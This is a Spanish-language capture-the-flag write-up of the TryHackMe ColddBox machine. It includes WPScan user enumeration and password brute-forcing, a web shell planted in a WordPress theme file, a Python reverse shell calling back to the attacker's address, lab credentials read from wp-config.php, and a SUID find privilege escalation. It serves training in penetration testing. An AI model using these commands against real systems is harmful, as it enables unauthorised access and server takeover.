---
layout: single
title: Writeup THM - Maquina Colddbox
comments: true
excerpt: "ColddBox es una maquina de TryHackMe de nivel Easy, es una buena maquina para reforzar conocimientos. Empezaremos enumerando y encontramos una pagina hecha en wordpress, con wpscan podremos encontrar usuarios y realizar fuerza bruta, accedemos al panel de control de wordpress con credenciales que encontramos en nuestro anterior ataque de fuerza bruta. Editaremos un theme de wordpress para generar una reverse shell y somos un usuario www-data, pero rapidamente encontramos credenciales del user c0ldd en el archivo wp-config.php y por ultimo logramos ser root abusando de un binario find con permisos SUID."
date: 2022-01-27
classes: wide
header:
  teaser: /assets/images/2022-01-27-writeup-thm-colddbox/Untitled.png
  teaser_home_page: true
categories:
  - TryHackMe
tags:
  - OSCP  
  - Hacking
  - easy
  - Wordpress
  - wpscan
  - enumerate
  - bruteforce
  - wp-config
  - suid
  - find
---

# ColddBox

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled.png)

## Resumen:

ColddBox es una maquina de TryHackMe de nivel Easy, es una buena maquina para reforzar conocimientos. Empezaremos enumerando y encontramos una pagina hecha en wordpress, con wpscan podremos encontrar usuarios y realizar fuerza bruta, accedemos al panel de control de wordpress con credenciales que encontramos en nuestro anterior ataque de fuerza bruta. Editaremos un theme de wordpress para generar una reverse shell y somos un usuario www-data, pero rapidamente encontramos credenciales del user c0ldd en el archivo wp-config.php y por ultimo logramos ser root abusando de un binario find con permisos SUID.

## Scan Nmap
<p align="center">
<img src="/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%201.png">
</p>

## Port 80 - Wordpress

```bash
ColddBox ❯ wpscan --url 10.10.202.208 --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[snip]

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <============================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan 27 21:10:40 2022
[+] Requests Done: 75
[+] Cached Requests: 6
[+] Data Sent: 17.239 KB
[+] Data Received: 17.997 MB
[+] Memory used: 186.215 MB
[+] Elapsed time: 00:02:42
```

usuarios encontrados

```bash
c0ldd
hugo
philip
```

haremos fuerza bruta con wpscan al usuario C0ldd

```bash
ColddBox ❯ wpscan --url http://10.10.202.208 --usernames c0ldd --passwords /usr/share/wordlists/rockyou.txt -t 50
```

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%202.png)

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%203.png)

genial pudimos encontrar credenciales con nuestro ataque de fuerza bruta

```bash
c0ldd:9876543210
```

accdemos al panel de control de wordpress con dichas credenciales

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%204.png)

iremos a la session Apperance → Editor, modificaremos el archivo 404.php para crear nuestra web shell

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%205.png)

accderemos a nuestra reverse en la siguiente ruta

```bash
http://10.10.202.208/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%206.png)

ahora nos toca crear una reverse shell para ello dejaremos en escucha el puerto 443 en escucha

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%207.png)

generaremos una reverse shell de la siguiente manera

```bash
http://10.10.202.208/wp-content/themes/twentyfifteen/404.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.132.249%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22bash%22)%27
```

y logramos conectarnos  y ejecutar comandos en la maquina victima

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%208.png)

## User c0ldd

en el archivo de configuracion de wp-config.php logramos encontrar credenciales del user c0ldd

```bash
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ cat /var/www/html/wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

[snip]
```

credenciales encontradas 

```bash
c0ldd:cybersecurity
```

asi que accedemos con dichas credenciales

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%209.png)

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%2010.png)

## Escalacion de privilegios - User Root

para poder escalar privilegios buscaremos si tenemos un binario con permisos de SUID para lograr ser root

```bash
c0ldd@ColddBox-Easy:/home$ find / -type f -perm -u=s 2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

y explotamos dicho binario find con permisos de SUID 

```bash
find . -exec /bin/sh -p \; -quit
```

![Untitled](/assets/images/2022-01-27-writeup-thm-colddbox/Untitled%2011.png)

Muchas gracias por tomarte tu tiempo en leer, nos vemos.